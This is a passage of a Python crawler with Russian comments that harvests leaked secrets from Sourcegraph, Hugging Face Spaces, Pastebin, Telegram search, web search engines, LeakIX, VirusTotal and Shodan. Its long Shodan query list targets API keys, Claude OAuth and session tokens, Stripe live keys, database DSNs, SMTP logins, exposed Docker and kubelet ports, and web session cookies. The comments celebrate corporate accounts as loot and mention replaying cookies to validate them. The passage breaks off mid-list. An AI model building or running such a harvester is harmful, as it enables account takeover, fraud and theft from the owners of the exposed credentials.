        headers = {"Accept": "text/event-stream"}
        if CFG["sourcegraph_token"]:
            headers["Authorization"] = "token " + CFG["sourcegraph_token"]
        for q in (
            'context:global "sk-ant-api03" count:50',
            'context:global "api.siliconflow.cn" "sk-" count:50',
            'context:global "gpt-5.6-sol" "sk-" count:50',
        ):
            try:
                r = http(
                    "GET",
                    "https://sourcegraph.com/.api/search/stream?q=%s&v=V3&t=literal"
                    % urlquote(q),
                    timeout=(10, 30),
                    headers=headers,
                )
                if r.status_code != 200:
                    if r.status_code in (401, 403):
                        log("  [sourcegraph] auth required")
                        return out
                    continue
                # весь SSE-текст скармливаем экстрактору
                out.append((r.text, "sourcegraph:" + q[:24]))
                r.close()
            except Exception:
                continue
        return out


class HfSpaces(Source):
    """HF Spaces: реальный список файлов через siblings API, свежие спейсы первыми."""

    name = "hf-spaces"
    # файлы где чаще всего хардкодят ключи
    FILE_RE = re.compile(
        r"(app\.py|main\.py|config\.py|\.env|\.env\.local|\.env\.example|secrets\.py|"
        r"settings\.py|utils\.py|api\.py|bot\.py|keys\.py|constants\.py|client\.py|"
        r"backend\.py|server\.py|llm\.py|agent\.py|chain\.py|rag.*\.py|chat.*\.py)$",
        re.I,
    )
    TERMS = [
        "openai",
        "claude",
        "api key",
        "chatgpt",
        "gpt-4",
        "llm",
        "anthropic",
        "deepseek",
        "gemini",
        "openrouter",
        "proxy",
        "rag",
        "agent",
    ]

    def fetch(self):
        out, space_ids = [], {}
        for term in self.TERMS:
            try:
                r = http(
                    "GET",
                    "https://huggingface.co/api/spaces?search=%s&limit=20&sort=lastModified&direction=-1"
                    % urlquote(term),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                for sp in r.json()[:20]:
                    sid = sp.get("id")
                    lm = sp.get("lastModified") or sp.get("lastModifiedAt") or ""
                    if sid:
                        space_ids[sid] = lm
            except Exception:
                continue
        # свежие первыми
        ordered = sorted(space_ids.items(), key=lambda x: x[1], reverse=True)[:80]

        # фаза 1: siblings API -> реальные имена файлов
        urls = []

        def list_files(sid):
            try:
                r = http(
                    "GET", "https://huggingface.co/api/spaces/%s" % sid, timeout=(6, 12)
                )
                if r.status_code != 200:
                    return []
                sibs = r.json().get("siblings") or []
                branch = (r.json().get("sdk") and "main") or "main"
                files = []
                for s in sibs:
                    fn = s.get("rfilename", "")
                    if self.FILE_RE.search(fn) and not fn.startswith("vector_"):
                        files.append(
                            "https://huggingface.co/spaces/%s/raw/main/%s" % (sid, fn)
                        )
                return files[:6]
            except Exception:
                return []

        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            for files in ex.map(lambda s: list_files(s[0]), ordered):
                urls.extend(files)

        # фаза 2: качаем файлы
        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
            futs = {ex.submit(fetch_text, u, (5, 10), 250_000): u for u in urls[:300]}
            for f in concurrent.futures.as_completed(futs):
                try:
                    t, _ = f.result()
                    if t and (
                        "sk-" in t or "api_key" in t.lower() or "apikey" in t.lower()
                    ):
                        out.append((t, futs[f]))
                except Exception:
                    continue
        return out


class Pastebin(Source):
    name = "pastebin"

    def fetch(self):
        out = []
        try:
            # CF-фронт: cloudscraper с прокси-фолбэком (было: голый fetch_text
            # — челлендж = "HTTP403" и пустой источник)
            r = cloud_get("https://pastebin.com/archive")
            txt = r.text if (r is not None and r.status_code == 200) else ""
            if not txt:
                txt, code = fetch_text("https://pastebin.com/archive", (8, 15), 300_000)
                if not txt:
                    log("  [pastebin] HTTP%s" % code)
                    return out
            ids = re.findall(r'href="/([A-Za-z0-9]{6,12})(?:\?[^"\s]*)?"', txt)
            skip = (
                "archive",
                "tools",
                "api",
                "faq",
                "login",
                "signup",
                "languages",
                "settings",
                "contact",
                "dmca",
                "privacy",
                "terms",
                "manage",
            )
            ids = [i for i in dict.fromkeys(ids) if i not in skip][
                : CFG["max_pastebins"]
            ]
        except Exception:
            return out
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs = {
                ex.submit(
                    fetch_text, "https://pastebin.com/raw/" + i, (6, 12), 300_000
                ): i
                for i in ids
            }
            for f in concurrent.futures.as_completed(futs):
                try:
                    t, _ = f.result()
                    if t:
                        out.append((t, "https://pastebin.com/" + futs[f]))
                except Exception:
                    continue
        return out


class TGSearch(Source):
    """Telegram-поисковики (lyzem/telegago): контент публичных каналов
    без знания имён каналов. Сцена выкладывает комблисты/аккаунты в TG."""

    name = "tg-search"

    def fetch(self):
        out = []
        queries = (
            "sk-ant-api03",
            "MAIL_PASSWORD",
            "claude max account",
            "chatgpt combo",
            "mail pass combo",
        )
        for engine in (
            "https://lyzem.com/search?q=",
            "https://telegago.com/search?q=",
        ):
            for q in queries[:3]:
                try:
                    r = http("GET", engine + urlquote(q), timeout=(8, 15))
                    if r is None or r.status_code != 200:
                        continue
                    # вырезаем скрипты/стили, оставляем текст снипетов
                    text = re.sub(
                        r"<script[\s\S]*?</script>|<style[\s\S]*?</style>", "", r.text
                    )
                    text = re.sub(r"<[^>]+>", " ", text)
                    if len(text) > 500:
                        out.append(
                            (
                                text[:200_000],
                                "tg-search:%s%s" % (engine.split("/")[2], q),
                            )
                        )
                except Exception:
                    continue
        if out:
            log("  [tg-search] %d страниц" % len(out))
        return out


class SearchDDG(Source):
    """DuckDuckGo HTML + Bing фолбэк: rentry/telegra.ph/justpaste/форумы."""

    name = "se-ddg"

    def fetch(self):
        out, seen_urls = [], set()
        sess = requests.Session()
        sess.headers.update(UA)
        # РОТАЦИЯ: конфиг содержит 50+ запросов, гоняем по 12 за цикл —
        # полный обход каждые ~N циклов (иначе site:-запросы ниже [:12] мертвы)
        all_q = list(CFG["se_queries"])
        rot_idx = int(time.time() // 600)
        qbatch = [
            all_q[(rot_idx * 12 + j) % len(all_q)] for j in range(min(12, len(all_q)))
        ]
        for q in qbatch:
            page = None
            # 1) DDG
            try:
                r = sess.post(
                    "https://html.duckduckgo.com/html/",
                    data={"q": q},
                    timeout=(10, 25),
                    verify=False,
                )
                if r.status_code == 200:
                    page = r.text
            except Exception:
                page = None
            targets = []
            # DDG bot-challenge: 200-страница без результатов ("bots use
            # DuckDuckGo too") — page truthy, но матчей ноль -> фолбэк на Bing
            ddg_ok = bool(page) and 'class="result__a"' in page
            if page and ddg_ok:
                for sm in re.finditer(
                    r'class="result__snippet"[^>]*>(.*?)</a>', page, re.S
                ):
                    snip = htmllib.unescape(re.sub(r"<[^>]+>", "", sm.group(1)))
                    if len(snip) > 20:
                        out.append((snip, "ddg:" + q[:20]))
                # реальный порядок атрибутов DDG: class ПЕРЕД href
                for m in re.finditer(
                    r'<a[^>]*class="result__a"[^>]*href="([^"]+)"', page
                ):
                    href = m.group(1)
                    if "uddg=" in href:
                        qpart = href.split("uddg=", 1)[1].split("&", 1)[0]
                        real = unquote(qpart)
                    elif href.startswith("http"):
                        real = href
                    else:
                        continue
                    targets.append(real)
            if not ddg_ok:
                # 2) Bing фолбэк (когда DDG заблокирован)
                try:
                    rb = sess.get(
                        "https://www.bing.com/search?q=%s&count=15" % urlquote(q),
                        timeout=(10, 25),
                        verify=False,
                    )
                    if rb.status_code == 200:
                        for m in re.finditer(
                            r'<h2><a href="(https?://[^"]+)"', rb.text
                        ):
                            targets.append(m.group(1))
                        # сниппеты Bing
                        for sm in re.finditer(
                            r'<p class="b_lineclamp[^"]*">(.*?)</p>', rb.text, re.S
                        ):
                            snip = htmllib.unescape(re.sub(r"<[^>]+>", "", sm.group(1)))
                            if len(snip) > 30:
                                out.append((snip, "bing:" + q[:20]))
                except Exception:
                    pass
            for real in targets[: CFG["se_max_pages"]]:
                if real in seen_urls or SKIP_URL_RE.search(real):
                    continue
                seen_urls.add(real)
                try:
                    t, _ = fetch_text(real, (8, 18), 500_000)
                    if t:
                        out.append((t, real))
                except Exception:
                    continue
            time.sleep(1.5)  # анти rate-limit
        return out


class SearxNG(Source):
    name = "se-searxng"

    def fetch(self):
        out = []
        inst = None
        for base in CFG["searx_instances"]:
            try:
                r = http("GET", base + "/search?q=test&format=json", timeout=(6, 10))
                if r.status_code == 200:
                    inst = base
                    break
            except Exception:
                continue
        if not inst:
            log("  [se-searxng] нет живых инстансов")
            return out
        for q in CFG["se_queries"][:8]:
            try:
                r = http(
                    "GET",
                    inst + "/search?q=%s&format=json" % urlquote(q),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                for res in (r.json().get("results") or [])[:8]:
                    content = res.get("content") or ""
                    if content:
                        out.append((content, "searx:" + str(res.get("url", ""))[:60]))
                    u = res.get("url")
                    if u and not SKIP_URL_RE.search(u):
                        try:
                            t, _ = fetch_text(u, (8, 18), 400_000)
                            if t:
                                out.append((t, u))
                        except Exception:
                            continue
            except Exception:
                continue
            time.sleep(1.0)
        return out


class LinuxDo(Source):
    name = "linux.do"

    def fetch(self):
        out = []
        r = cloud_get("https://linux.do/latest.json?no_definitions=true")
        if r is None or r.status_code != 200:
            log("  [linux.do] CF fail")
            return out
        try:
            topics = (r.json().get("topic_list") or {}).get("topics") or []
            tids = [t["id"] for t in topics if t.get("id")][:25]
        except Exception:
            return out
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
            futs = {
                ex.submit(cloud_get, "https://linux.do/t/%d.json" % i, (10, 20)): i
                for i in tids
            }
            for f in concurrent.futures.as_completed(futs):
                try:
                    rr = f.result()
                    if rr is None or rr.status_code != 200:
                        continue
                    try:
                        posts = rr.json().get("post_stream", {}).get("posts", [])
                        for p in posts:
                            txt = htmllib.unescape(
                                re.sub(r"<[^>]+>", " ", p.get("cooked", ""))
                            )
                            out.append((txt, "linux.do/t/%d" % futs[f]))
                    except Exception:
                        out.append((rr.text, "linux.do/t/%d" % futs[f]))
                except Exception:
                    continue
        return out


class V2ex(Source):
    name = "v2ex"

    def fetch(self):
        out = []
        for ep in (
            "https://www.v2ex.com/api/topics/hot.json",
            "https://www.v2ex.com/api/topics/latest.json",
        ):
            try:
                r = http("GET", ep, timeout=(8, 15))
                if r.status_code != 200:
                    continue
                for t in r.json()[:40]:
                    content = t.get("content") or ""
                    if content:
                        out.append((content, "v2ex:" + str(t.get("id"))))
            except Exception:
                continue
        return out


class LeakIX(Source):
    """LeakIX: поиск утечек (.env dump, config, keys). summary содержит ПОЛНЫЙ дамп окружения
    с реальными ключами (ViteJS CVE-2025-30208, exposed .env и т.д.). Самый жирный источник."""

    name = "leakix"

    QUERIES = (
        '"sk-ant-api03"',
        '"sk-proj-"',
        '"sk-or-v1-"',
        '"sk-svcacct-"',
        '"OPENAI_API_KEY"',
        '"ANTHROPIC_API_KEY"',
        '"api_key" "sk-"',
        '"API_KEY" "claude"',
        '"OPENROUTER_API_KEY"',
        '"GEMINI_API_KEY"',
        '"dashscope" "sk-"',
        '"siliconflow" "sk-"',
        '"moonshot" "sk-"',
        '".env" "API_KEY"',
        '"modelscope" "ms-"',
    )

    STATE_PATH = os.path.join(HERE, "leakix_state.json")

    def fetch(self):
        if not CFG.get("leakix_key"):
            return []
        out = []
        h = {"api-key": CFG["leakix_key"], "Accept": "application/json"}
        # АУДИТ-фикс: персистентный дедуп + ранний стоп пагинации — было:
        # 15 запросов × 4 страницы КАЖДЫЙ цикл по одним и тем же выдачам =
        # месячный кап сгорал на перекачке старья.
        try:
            _st = json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            _st = {}
        seen = set(_st.get("seen") or [])
        heads = _st.get("heads") or {}

        def _fp(item):
            return hashlib.sha1(
                (
                    str(item.get("host") or item.get("ip") or "")
                    + "|"
                    + str(item.get("summary") or "")[:120]
                ).encode()
            ).hexdigest()[:20]

        for q in self.QUERIES:
            # пагинация: страницы 0-3 = до 80 результатов на запрос
            for page in range(4):
                try:
                    r = http(
                        "GET",
                        "https://leakix.net/search?scope=leak&q=%s&page=%d"
                        % (urlquote(q), page),
                        timeout=(20, 40),
                        headers=h,
                    )
                    if r is not None and r.status_code == 429:
                        time.sleep(6)  # rate-limit: один ретрай (было: молчали
                        # и обрывали пагинацию по ВСЕМ запросам сразу)
                        try:
                            r = http(
                                "GET",
                                "https://leakix.net/search?scope=leak&q=%s&page=%d"
                                % (urlquote(q), page),
                                timeout=(20, 40),
                                headers=h,
                            )
                        except Exception:
                            r = None
                    if r is None or r.status_code != 200:
                        break
                    j = r.json()
                    if not isinstance(j, list) or not j:
                        break
                    # голова выдачи не изменилась = страницы 1-3 не новее —
                    # НЕ жжём запросы на них
                    if page == 0:
                        head = _fp(j[0])
                        if heads.get(q) == head and all(_fp(it) in seen for it in j):
                            break
                        heads[q] = head
                    page_new = 0
                    for item in j:
                        fp = _fp(item)
                        if fp in seen:
                            continue
                        seen.add(fp)
                        # ключи в summary (полный дамп окружения) и service
                        blob = (
                            (item.get("summary") or "")
                            + "\n"
                            + json.dumps(item.get("service") or {}, ensure_ascii=False)
                            + "\n"
                            + json.dumps(item.get("http") or {}, ensure_ascii=False)
                        )
                        if blob.strip():
                            host = item.get("host") or item.get("ip") or "?"
                            out.append((blob, "leakix:%s" % host))
                            page_new += 1
                    # страница без единой новой записи = дальше только старьё
                    if page > 0 and page_new == 0:
                        break
                except Exception:
                    continue
        try:
            _tmp = self.STATE_PATH + ".tmp"
            with open(_tmp, "w", encoding="utf-8") as _f:
                json.dump({"seen": list(seen)[-6000:], "heads": heads}, _f)
            os.replace(_tmp, self.STATE_PATH)
        except Exception:
            pass
        return out


class VirusTotal(Source):
    """VirusTotal: passive DNS + subdomain discovery — находим новые relay-домены."""

    name = "virustotal"

    # домены из relay-бордов, у которых ищем субдомены api.*
    def fetch(self):
        if not CFG.get("virustotal_key"):
            return []
        out = []
        h = {"x-apikey": CFG["virustotal_key"], "Accept": "application/json"}
        doms = []
        try:
            with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
                for r in json.load(f):
                    d = r.get("domain")
                    if d:
                        # убираем api. префикс, берём базовый домен
                        base = d.replace("api.", "", 1) if d.startswith("api.") else d
                        doms.append(base)
        except Exception:
            pass
        doms = list(dict.fromkeys(doms))
        # АУДИТ-фикс: фиксированное [:12] окно — новые релеи не сканировались
        if len(doms) > 12:
            _rot = int(time.time() // 900)
            _st = (_rot * 12) % len(doms)
            doms = [doms[(_st + i) % len(doms)] for i in range(12)]
        for dom in doms:
            try:
                r = http(
                    "GET",
                    "https://www.virustotal.com/api/v3/domains/%s/subdomains?limit=40"
                    % dom,
                    timeout=(12, 25),
                    headers=h,
                )
                # public API: 4 req/min — burst из 12 доменов мгновенно 429.
                # один ретрай после паузы + 3с между доменами
                if r is not None and r.status_code == 429:
                    time.sleep(15)
                    r = http(
                        "GET",
                        "https://www.virustotal.com/api/v3/domains/%s/subdomains?limit=40"
                        % dom,
                        timeout=(12, 25),
                        headers=h,
                    )
                if r is None or r.status_code != 200:
                    continue
                subs = [d.get("id") for d in (r.json().get("data") or [])]
                apiish = [
                    s2
                    for s2 in subs
                    if s2 and re.match(r"^(api|llm|gpt|ai|proxy|openai|chat)\.", s2)
                ]
                if apiish:
                    out.append(("\n".join(apiish), "virustotal:%s" % dom))
                time.sleep(3)
            except Exception:
                continue
        return out


class Shodan(Source):
    """Shodan: пул ключей (edu 198k кредитов + dev), пагинация, html-извлечение."""

    name = "shodan"

    # запросы: только single-pattern (multi-term в shodan дают 0)
    # (запрос, страниц_за_цикл) — большие пулы глубоко пагинируем по ротации
    QUERIES = [
        # 🔥 ЖИР: CC-OAuth прокси (Max/Pro подписки) — 5637 хостов (в 4р шире oat01)
        ('http.html:"setup_token"', 8),
        # Claude OAuth токены — 1470
        ('http.html:"sk-ant-oat01"', 5),
        # жир: anthropic (opus) — 1550 хостов
        ('http.html:"sk-ant-"', 5),
        # openai service accounts (gpt-5.6) — 22
        ('http.html:"sk-svcacct-"', 2),
        # exposed env-конфиги — 169 + 49
        ('http.html:"OPENAI_API_KEY"', 4),
        ('http.html:"ANTHROPIC_API_KEY"', 3),
        # relay-конфиги с ключами — 74
        ('http.html:"OPENAI_BASE_URL"', 4),
        # bearer-утечки — 60
        ('http.html:"Authorization: Bearer sk-"', 2),
        # openrouter / openai proj
        ('http.html:"sk-or-"', 3),
        ('http.html:"sk-proj-"', 4),
        # волна 2: relay-панели и провайдер-конфиги
        ('http.html:"one-api"', 5),  # 3515 relay-панелей
        ('http.html:"new-api"', 3),  # relay-панели (клоны one-api)
        ('http.html:"openrouter"', 3),  # 1645 openrouter-конфигов
        ('http.html:"moonshot"', 2),  # 518
        # kimi web refresh-токены (JWT) в куках/конфигах на страницах
        ('http.html:"eyJhbGciOiJIUzUxMiIs"', 2),
        ('http.html:"DATABASE_URL"', 3),  # 71 env-дампов (связки ключей)
        ('http.html:"dashscope"', 2),  # 65
        ('http.html:"deepseek.com"', 2),  # 39
        ('http.html:"siliconflow"', 2),  # 38
        ('http.html:"AIzaSy"', 2),  # 20 (точнее AIza)
        # антропик-фокус: claude-code конфиги + opus/sonnet референсы
        ('http.html:"claude-code"', 5),  # 3112 — claude code конфиги с ключами
        ('http.html:"x-api-key"', 5),  # 5821 — страницы с api-key заголовками
        ('http.html:"claude-opus"', 2),  # 496
        ('http.html:"claude-sonnet"', 2),  # 657
        ('http.html:"ANTHROPIC_AUTH_TOKEN"', 1),  # 25
        ('http.html:"OPENROUTER_API_KEY"', 1),  # 6
        ('http.html:"anthropic.com"', 1),  # 43
        ('http.html:"claude-api-key"', 1),  # 23
        # жирные relay-конфиги
        ('http.html:"weelinking"', 1),
        ('http.html:"laozhang"', 1),
        # прочие ключи
        ('http.html:"gsk_"', 2),
        ('http.html:"hf_"', 2),
        ('http.html:"lfu_"', 1),
        ('http.html:"xai-"', 2),
        # из shodan2apikey: ADMIN-ключи Anthropic (орг-уровень — жирнее Max!)
        ('http.html:"sk-ant-admin01-"', 2),
        # refresh-токены в HTML (минтят Pro/Max доступ перманентно)
        ('http.html:"sk-ant-ort01-"', 2),
        # креды поисковиков = расширяем ёмкость охоты
        ('http.html:"SHODAN_API_KEY"', 2),
        ('http.html:"CENSYS_API_ID"', 1),
        # 🔥 НОВАЯ ВОЛНА: web-сессии Claude (корпоративные!)
        ('http.html:"sk-ant-sid01-"', 2),
        ('http.html:"sk-ant-at01-"', 1),
        # credentials-файлы Claude Code (oat01+ort01 пары!)
        ('http.html:".claude/credentials"', 2),
        ('http.html:"claudeAiOauth"', 2),
        # .claude.json конфиги (134 хоста: OAuth-токены в JSON-полях)
        ('http.html:".claude.json"', 2),
        # relay-панели новой волны
        ('http.html:"veloera"', 1),
        ('http.html:"chatnio"', 2),  # 74 панели
        ('http.html:"lobe-chat"', 2),
        # Next.js env-утечки (фронтенды с ключами)
        ('http.html:"NEXT_PUBLIC_OPENAI_API_KEY"', 2),
        ('http.html:"NEXT_PUBLIC_ANTHROPIC_API_KEY"', 1),
        # свежие модели в конфигах
        ('http.html:"claude-fable"', 2),
        ('http.html:"opus-4-8"', 2),
        ('http.html:"gpt-5.6"', 2),
        # промпт-фабрики и API-маркеты
        ('http.html:"deepinfra"', 1),
        ('http.html:"together.xyz"', 1),
        ('http.html:"fireworks.ai"', 1),
        # 🔥 PRO/MAX/CORP-подписки: максимум охвата OAuth/credentials-утечек
        ('http.html:"sk-ant-at01"', 2),  # agent-токены (новый формат)
        ('http.html:"CLAUDE_CODE_OAUTH_TOKEN"', 2),  # env с oat01
        ('http.html:"claude_desktop_config"', 2),  # десктоп-конфиги с ключами
        ('http.html:"claude-relay"', 2),  # self-hosted relay с токенами
        ('http.html:"claude-code-proxy"', 2),
        ('http.html:"ANTHROPIC_BASE_URL"', 2),  # кастомные деплои с ключами
        ('http.html:"sessionKey"', 2),  # веб-сессии claude.ai (КОРП аккаунты)
        ('http.html:"LITELLM_MASTER_KEY"', 1),  # litellm мастер-ключи
        ('http.html:".aider.conf"', 1),  # aider-конфиги с ключами
        # кросс-платформенные токены/деньги
        ('http.html:"github_pat_"', 2),  # fine-grained PAT
        ('http.html:"glpat-"', 2),  # GitLab PAT
        ('http.html:"nvapi-"', 2),  # NVIDIA NIM
        ('http.html:"pplx-"', 2),  # Perplexity Pro
        ('http.html:"sk_live_"', 2),  # Stripe LIVE
        ('http.html:"rk_live_"', 1),  # Stripe restricted
        ('http.html:"tgp_v1_"', 1),  # Together
        # ============ MAX EXPANSION: env-экспоузы всех провайдеров ============
        ('http.html:"DEEPSEEK_API_KEY"', 2),
        ('http.html:"MOONSHOT_API_KEY"', 2),
        ('http.html:"DASHSCOPE_API_KEY"', 2),
        ('http.html:"GEMINI_API_KEY"', 2),
        ('http.html:"GOOGLE_API_KEY"', 2),
        ('http.html:"GROQ_API_KEY"', 2),
        ('http.html:"PERPLEXITY_API_KEY"', 1),
        ('http.html:"MISTRAL_API_KEY"', 2),
        ('http.html:"COHERE_API_KEY"', 1),
        ('http.html:"TOGETHER_API_KEY"', 1),
        ('http.html:"FIREWORKS_API_KEY"', 1),
        ('http.html:"SILICONFLOW_API_KEY"', 1),
        ('http.html:"ZHIPUAI_API_KEY"', 1),
        ('http.html:"MINIMAX_API_KEY"', 1),
        ('http.html:"STEPFUN_API_KEY"', 1),
        ('http.html:"HUNYUAN_API_KEY"', 1),
        ('http.html:"JINA_API_KEY"', 1),
        ('http.html:"REPLICATE_API_TOKEN"', 1),
        ('http.html:"NVIDIA_API_KEY"', 1),
        ('http.html:"CEREBRAS_API_KEY"', 1),
        ('http.html:"SAMBANOVA_API_KEY"', 1),
        ('http.html:"AZURE_OPENAI_API_KEY"', 2),
        ('http.html:"CLAUDE_API_KEY"', 2),
        ('http.html:"LLM_API_KEY"', 2),
        ('http.html:"OPENAI_KEY"', 2),
        ('http.html:"ANTHROPIC_KEY"', 1),
        # ============ env/конфиг-дампы (Laravel/.env/связки) ============
        ('http.html:"APP_KEY=base64"', 3),  # Laravel .env — часто с OPENAI_*
        ('http.html:"DB_PASSWORD"', 3),  # env-дампы
        ('http.html:"MAIL_PASSWORD"', 1),
        ('http.html:"AWS_SECRET_ACCESS_KEY"', 2),
        ('http.html:"OPENAI_API_BASE"', 2),
        ('http.html:"api_keys.json"', 1),
        ('http.html:"keys.json"', 1),
        # ============ LiteLLM конфиги: мастер-ключи и апстрим-ключи в открытую ============
        ('http.html:"litellm_params"', 2),  # конфиги litellm с api_key внутри
        ('http.html:"master_key"', 2),
        ('http.html:"/key/generate"', 1),
        ('http.html:"GENERAL_SETTINGS"', 1),  # litellm ui settings
        # ============ форматы ключей ============
        ('http.html:"r8_"', 1),  # Replicate
        ('http.html:"vck_"', 1),  # Vercel AI Gateway
        ('http.html:"csk-"', 1),  # Cerebras
        ('http.html:"jina_"', 1),  # Jina
        ('http.html:"gho_"', 2),  # GitHub OAuth
        ('http.html:"ghp_"', 2),  # GitHub PAT
        ('http.html:"sbp_"', 1),  # Supabase
        ('http.html:"sk-ant-sid01"', 3),  # веб-сессии (повтор с бОльшей глубиной)
        ('http.html:"sk-ant-sid02"', 3),  # новый формат сессий claude.ai
        # ============ панели по title (релеи с ключами в конфиге) ============
        ('http.title:"LiteLLM"', 2),
        ('http.title:"Open WebUI"', 2),
        ('http.title:"Dify"', 2),
        ('http.title:"FastGPT"', 2),
        ('http.title:"LobeChat"', 1),
        ('http.title:"ChatGPT Next Web"', 2),
        ('http.title:"LibreChat"', 1),
        ('http.title:"Anything-LLM"', 1),
        ('http.title:"Flowise"', 1),
        ('http.title:"New API"', 3),
        ('http.title:"One API"', 3),
        ('http.title:"Veloera"', 1),
        ('http.title:"Chat Nio"', 1),
        ('http.title:"Ollama"', 1),
        ('http.title:"Gradio"', 1),
        ('http.title:"SillyTavern"', 1),
        # ============ свежие флаги моделей (релеи палят прайс-листы) ============
        ('http.html:"gpt-5.6-sol"', 2),
        ('http.html:"gpt-5.6-astro"', 2),
        ('http.html:"claude-opus-5"', 2),
        ('http.html:"claude-fable-5"', 2),
        ('http.html:"gemini-3-pro"', 2),
        ('http.html:"grok-4"', 1),
        ('http.html:"glm-5.3"', 2),
        ('http.html:"deepseek-v4"', 2),
        ('http.html:"kimi-k3"', 2),
        ('http.html:"minimax-m3"', 1),
        ('http.html:"qwen3.8"', 1),
        # ============ Azure/MiMo/MiniMax (чат-разведка) ============
        ('http.html:"openai.azure.com"', 2),  # корп-конфиги: deployment URL + api-key
        ('http.html:"api.minimaxi.com"', 1),
        ('http.html:"token-plan-cn"', 1),  # Xiaomi MiMo планы
        # ============ multi-term высокоточные (эмпирически проверено) ============
        ('http.html:"sk-" "/v1"', 3),  # total~350, 77% точность против 35% у голого sk-
        ('http.html:"api_key" "/v1"', 1),
        ('http.html:"baseURL" "apiKey"', 1),  # JS-конфиги фронтов
        ('http.html:"https://api.openai.com/v1"', 2),  # vendor-URL в чужих конфигах
        ('http.html:"ANTHROPIC_API_KEY" "sk-ant"', 1),
        ('http.html:"OPENAI_API_KEY" "sk-"', 1),
        # ============ ПОДПИСКИ: неординарные пути (куки/сессии/credentials) ============
        (
            'http.html:"oauthAccount"',
            3,
        ),  # .credentials.json: scopes + subscriptionType=max ВИДЕН БЕЗ ПРОБЫ!
        ('http.html:"expiresAt" "refreshToken"', 2),  # OAuth-пары oat01+ort01 в дампах
        ('http.html:"sessionKey" "claude"', 2),  # веб-куки claude.ai (sid01) в логах
        ('http.html:".claude/.credentials.json"', 2),  # пути в логах/билдах/дампах
        ('http.html:"installMethod" "claude"', 1),  # маркер ~/.claude.json
        ('http.html:"hasOnboarded" "claude"', 1),  # второй маркер claude.json
        ('http.html:"ANTHROPIC_BASE_URL"', 2),  # CC→прокси сетапы (рядом и токены)
        ('http.html:"ANTHROPIC_CUSTOM_HEADERS"', 1),  # CC env
        ('http.html:"CLAUDE_CONFIG_DIR"', 1),  # env кастомного конфига CC
        ('http.html:"primaryApiKey"', 1),  # поле api-ключа в claude.json
        (
            'http.title:"Index of /" ".credentials.json"',
            2,
        ),  # открытые листинги с кредами
        (
            'http.html:"sk-ant-oat01" "expiresAt"',
            2,
        ),  # свежие полные дампы credentials.json
        ('port:2375 "ANTHROPIC"', 1),  # ОТКРЫТЫЙ Docker API с claude-env в контейнерах!
        ('port:2375 "CLAUDE"', 1),
        ('port:10250 "ANTHROPIC"', 1),  # kubelet /pods: env-переменные подов с ключами
        # ============ ПОДПИСКИ волна-2: конфиги тулзов и .claude.json ============
        (
            'http.html:".claude.json"',
            2,
        ),  # главный конфиг CC: oauthAccount+subscriptionType ВИДНЫ
        (
            'http.title:"Index of /" ".claude"',
            2,
        ),  # открытые листинги .claude-директорий
        ('http.html:"opencode" "sk-ant"', 1),  # opencode конфиги с anthropic-ключами
        ('http.html:"continue" "sk-ant-"', 1),  # continue.dev конфиги
        ('http.html:"cline" "sk-ant"', 1),  # cline (VSCode) конфиги
        ('http.html:"roo" "sk-ant-api03"', 1),  # roo-code
        # 🔥 фронтир-прокси: код с oauth-beta хедером = свежие CC-прокси с oat01
        ('http.html:"oauth-2025-04-20"', 1),
        ('http.html:"anthropic-beta"', 1),
        ('http.html:"claude-opus-4-8" "sk-ant"', 1),
        # волна P1.4: oat01+refreshToken-пары, veloera, litellm master, docker API
        ('http.html:"sk-ant-oat01" "refreshToken"', 2),
        ('http.html:"veloera" "sk-"', 1),
        ('http.html:"LITELLM_MASTER_KEY" "sk-"', 2),
        ('port:2375 "OPENAI_API_KEY"', 1),
        # НЕОРДИНАРНО: живые .credentials.json / dotfiles на открытых хостах
        ('http.html:".credentials.json" "refreshToken"', 2),
        ('http.html:"sk-ant-ort01"', 2),
        ('http.html:"claudeAiOauth" "refreshToken"', 1),
        # ============ 🍪 КУКИ-ВОЛНА: сессии/куки в лог-дампах и cookies.txt ============
        # объёмы по разведке 2026-09-05; URL-встроенные сессии краулера отсекает
        # экстрактор (lookbehind), мёртвые куки — валидатор реплеем на origin.
        ('http.html:"Cookie: laravel_session"', 2),  # 188 — лог-дампы с юзер-сессиями
        ('http.html:"wordpress_logged_in_"', 3),  # 353 — WP auth-куки (wp-admin!)
        ('http.html:"wordpress_sec_"', 1),  # 59
        ('http.html:".ASPXAUTH="', 1),  # 47 — .NET forms-auth тикеты
        ('http.html:"Cookie: PHPSESSID"', 2),  # 33
        ('http.html:"ASP.NET_SessionId="', 1),  # 114
        ('http.html:"Netscape HTTP Cookie File"', 1),  # 7 — экспортнутые cookies.txt
        ('http.html:"Cookie: JSESSIONID"', 1),  # 7
        ('http.html:"Cookie: SAPISID"', 1),  # 2 — google-сессии в лог-дампах
        ('http.html:"grafana_session="', 1),  # 2 — admin-панели
        (
            'http.html:"laravel_session"',
            2,
        ),  # 211 — суперсет (Set-Cookie echo + конфиги)
        ('http.html:"PHPSESSID="', 2),  # 3687 — mixed; экстрактор отсеет url-сессии
        ('http.html:"JSESSIONID="', 2),  # 77k — в основном self-sessions, но и логи
        ('http.html:"access_token"', 2),  # 16k — открытые API-дампы (JWT/токены)
        ('http.html:"refresh_token"', 1),  # 2243
        ('http.html:"Set-Cookie:"', 2),  # 22k — echo-страницы/логи прокси
        # 🗄️ ДАМПЫ: postgres DSN / SMTP-креды в открытых конфигах хостов
        # (ZOLTRAAK-поток: neon/supabase postgres + gmail SMTP из .env)
        ('http.html:"postgresql://"', 3),  # открытые postgres-DSN любые
        ('http.html:"postgres://"', 2),
        ('http.html:"smtp.gmail.com"', 2),  # SMTP-конфиги с кредами
        ('http.html:"npg_"', 1),  # neon.tech пароли (npg_XXXX)
        ('http.html:"DATABASE_URL"', 4),  # жирнее: полный env-дамп
        # 🔑 BASETEN: 8.32 ключи на страницах
        ('http.html:"baseten"', 2),
        ('http.html:"BASETEN_API_KEY"', 3),
        ('http.html:"trussrc"', 2),  # truss CLI конфиг с api_key
        ('http.html:"inference.baseten.co/v1"', 2),
        # ============ 🗄️ ДАМП-ВОЛНА (ZOLTRAAK-таргет): DSN всех движков ============
